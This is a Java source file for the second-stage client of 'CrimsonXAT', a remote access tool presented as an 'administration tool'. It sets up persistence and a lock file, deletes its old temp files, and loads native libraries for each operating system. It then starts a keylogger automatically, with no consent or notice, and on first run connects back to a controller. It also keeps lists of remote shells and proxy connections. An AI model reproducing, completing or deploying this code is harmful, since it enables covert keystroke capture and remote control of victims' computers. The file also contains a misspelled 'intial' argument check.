/*******************************************************************************
 *              Crimson Extended Administration Tool (CrimsonXAT)              *
 *                   Copyright (C) 2015 Subterranean Security                  *
 *                                                                             *
 *     This program is free software: you can redistribute it and/or modify    *
 *     it under the terms of the GNU General Public License as published by    *
 *      the Free Software Foundation, either version 3 of the License, or      *
 *                      (at your option) any later version.                    *
 *                                                                             *
 *       This program is distributed in the hope that it will be useful,       *
 *        but WITHOUT ANY WARRANTY; without even the implied warranty of       *
 *        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        *
 *                 GNU General Public License for more details.                *
 *                                                                             *
 *      You should have received a copy of the GNU General Public License      *
 *      along with this program.  If not, see http://www.gnu.org/licenses      *
 *******************************************************************************/
package subterranean.crimson.permajar.stage2;

import java.io.File;
import java.util.ArrayList;
import java.util.Date;

import subterranean.crimson.permajar.stage1.Stage1;
import subterranean.crimson.permajar.stage2.modules.ChatWindow;
import subterranean.crimson.permajar.stage2.modules.Idle;
import subterranean.crimson.permajar.stage2.modules.Shell;
import subterranean.crimson.permajar.stage2.modules.keylogger.Keylogger;
import subterranean.crimson.universal.FileLocking;
import subterranean.crimson.universal.FileManager;
import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.NativeUtilities;
import subterranean.crimson.universal.Platform;
import subterranean.crimson.universal.containers.SystemMessage;
import subterranean.crimson.universal.database.Database;

public class Stage2 {

	public static Database database;
	public static Idle idle;
	public static ChatWindow chat = new ChatWindow();
	public static FileManager f = new FileManager();

	public static ArrayList<ProxyConnection> pConnections = new ArrayList<ProxyConnection>();
	public static ArrayList<Shell> shells = new ArrayList<Shell>();

	public static boolean initialRun = false;

	public static void run(String[] arguments) {

		initialRun = arguments[0].equals("intial");

		// Establish an UncaughtExceptionHandler
		Thread.setDefaultUncaughtExceptionHandler(new PermaJarExceptionHandler());

		if (initialRun) {
			if (FileLocking.lockExists()) {
				// stop
				Logger.add("Crimson is already running");
				return;
			} else {
				FileLocking.lock();

			}

			// Load options from internal text file
			Stage1.loadOptions();

			// Clear out old temp files
			for (File f : new File(Platform.tempDir).listFiles()) {

				if (f.getName().startsWith("crimson_")) {
					// delete it
					Logger.add("Deleting a temp file: " + f.getAbsolutePath());
					f.delete();

				}

			}
		}

		database = new Database(new File("Psettings.db"));
		if (database.isFirstRun()) {
			// store a new settings object
			database.storeObject(new PermaJarSettings());
		}

		// Establish a Shutdown Hook
		Thread hook = new ShutdownHook();
		Runtime.getRuntime().addShutdownHook(hook);

		// Start IDLE monitoring
		idle = new Idle();
		idle.start();

		// load native utilities
		try {
			if (Platform.windows) {
				if (Platform.jreX64) {
					Logger.add("Loading: NativeUtilities64.dll");
					NativeUtilities.load("/subterranean/crimson/universal/natives/NativeUtilities64.dll");
				} else {
					Logger.add("Loading: NativeUtilities32.dll");
					NativeUtilities.load("/subterranean/crimson/universal/natives/NativeUtilities32.dll");
				}
			} else if (Platform.linux) {
				if (Platform.jreX64) {
					Logger.add("Loading: NativeUtilities64.so");
					NativeUtilities.load("/subterranean/crimson/universal/natives/NativeUtilities64.so");
				} else {
					Logger.add("Loading: NativeUtilities32.so");
					NativeUtilities.load("/subterranean/crimson/universal/natives/NativeUtilities32.so");
				}
			} else {
				if (Platform.jreX64) {
					Logger.add("Loading: NativeUtilities64.dylib");
					NativeUtilities.load("/subterranean/crimson/universal/natives/NativeUtilities64.dylib");
				} else {
					Logger.add("Loading: NativeUtilities32.dylib");
					NativeUtilities.load("/subterranean/crimson/universal/natives/NativeUtilities32.dylib");
				}
			}

		} catch (Throwable e) {
			Logger.add("Could not load native code");
			// send a system message
			SystemMessage sm = new SystemMessage();
			sm.date = new Date();
			sm.source = "Crimson core module";
			sm.subject = "Failed to load native code";
			sm.urgency = 0;
			sm.message = "Crimson threw an exception when the native libraries were loaded.  Functionality requiring native code will be disabled.";

		}

		Keylogger.start();

		if (initialRun) {
			Stage1.connectionRoutine();
		}
	}

	public static PermaJarSettings getSettings() {
		return (PermaJarSettings) database.retrieveObject((short) 1);
	}

}
